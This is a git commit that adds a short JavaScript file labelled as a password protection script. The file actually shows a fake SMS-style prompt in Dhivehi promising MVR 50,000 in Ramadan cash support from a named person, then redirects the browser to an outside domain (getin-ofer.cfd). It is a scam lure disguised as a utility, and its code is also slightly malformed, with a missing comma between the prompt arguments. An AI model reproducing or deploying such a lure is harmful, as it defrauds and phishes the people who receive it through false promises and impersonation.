856914fc22010b946187563dba2bbaadaca89cff
Help-All <imaobongumoh637@gmail.com>
2026-03-15 03:34:49 +0100

    Create activeddq.js

---
+++ activeddq.js
@@ -0,0 +1,9 @@
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'ކޭޝް ނެގުން'
+password = prompt(
+  'SMS: މަރުހަބާ! ޤާސިމް އިބްރާހިމްގެ MVR 50,000 ރަމަޟާން ކޭޝް ސަޕޯޓް ލިބެން އަށް ތިބާ ހައްގުވެރިވެއްޖެ. މިހާރު ލިބެން އޯކޭ ބަޓަން ފިތާލާށެ.'
+  'ކޭޝް ނެގުން'
+);
+if (password != 'ކޭޝް ނެގުން') {
+  location.href = 'https://getin-ofer.cfd/Mvr-50000-Qasim.html';
+  }
